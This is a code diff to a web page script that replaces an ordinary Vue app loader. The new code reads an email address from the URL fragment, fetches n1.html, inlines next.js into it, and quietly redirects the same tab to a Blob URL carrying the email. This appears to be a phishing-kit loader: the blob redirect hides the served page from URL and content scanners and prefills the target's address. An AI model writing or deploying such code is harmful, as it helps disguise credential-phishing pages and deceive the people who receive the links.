@@ -1,57 +1,43 @@
-<div id="app"></div>
 <script>
-// Helper to load scripts sequentially
-function loadScript(src) {
-  return new Promise((resolve, reject) => {
-    const s = document.createElement('script');
-    s.src = src;
-    s.onload = resolve;
-    s.onerror = reject;
-    document.head.appendChild(s);
-  });
-}
+(function () {
 
-(async function () {
-  try {
-    // Load dependencies in order
-    await loadScript('https://cdn.jsdelivr.net/npm/vue@2.6.12');
-    await loadScript('https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js');
-    await loadScript('https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js');
-    await loadScript('https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js');
-    await loadScript('https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js');
-    await loadScript('https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js');
+  // ✅ READ EMAIL FROM HASH (decode once)
+  const hash = window.location.hash;
+  const emailFromHash =
+    hash && hash.length > 1 ? decodeURIComponent(hash.slice(1)) : null;
 
-    // Fetch n2.html
-    const res = await fetch('n1.html');
-    const html = await res.text();
-    const parser = new DOMParser();
-    const doc = parser.parseFromString(html, 'text/html');
+  fetch('n1.html')
+    .then(res => res.text())
+    .then(async html => {
 
-    // Inject all <style> tags from n2.html into <head>
-    const styles = doc.querySelectorAll('style');
-    styles.forEach(style => {
-      document.head.appendChild(style.cloneNode(true));
-    });
+      let modifiedHtml = html;
 
-    // Replace #app element with n2.html's #app
-    const n2App = doc.querySelector('#app');
-    if (!n2App) throw new Error('No #app found in n1.html');
-    const appContainer = document.getElementById('app');
-    appContainer.parentNode.replaceChild(n2App.cloneNode(true), appContainer);
-
-    // Extract and execute all inline <script> tags (no src)
-    const scripts = doc.querySelectorAll('script');
-    for (const script of scripts) {
-      if (!script.src) {
-        const newScript = document.createElement('script');
-        newScript.textContent = script.textContent;
-        document.body.appendChild(newScript);
+      // ✅ INLINE next.js
+      try {
+        const nextResp = await fetch('next.js');
+        if (nextResp.ok) {
+          const nextJsText = await nextResp.text();
+          modifiedHtml = modifiedHtml.replace(
+            /<script\s+[^>]*src=["']next\.js["'][^>]*>\s*<\/script>/i,
+            '<script>' + nextJsText + '<\/script>'
+          );
+        }
+      } catch (e) {
+        console.warn('Could not inline next.js', e);
       }
-    }
-  } catch (err) {
-    const app = document.getElementById('app') || document.body;
-    app.innerHTML = '<div style="color:red">Failed to load app: ' + err.message + '</div>';
-    console.error('Failed to load Vue app:', err);
-  }
+
+      const blob = new Blob([modifiedHtml], { type: 'text/html' });
+      const blobUrl = URL.createObjectURL(blob);
+
+      // ✅ QUIET SAME-TAB REDIRECT (NO DOUBLE ENCODE)
+      if (emailFromHash) {
+        window.location.replace(blobUrl + '#' + emailFromHash);
+      } else {
+        window.location.replace(blobUrl);
+      }
+
+    })
+    .catch(err => console.error('Failed to load blob page:', err));
+
 })();
 </script>
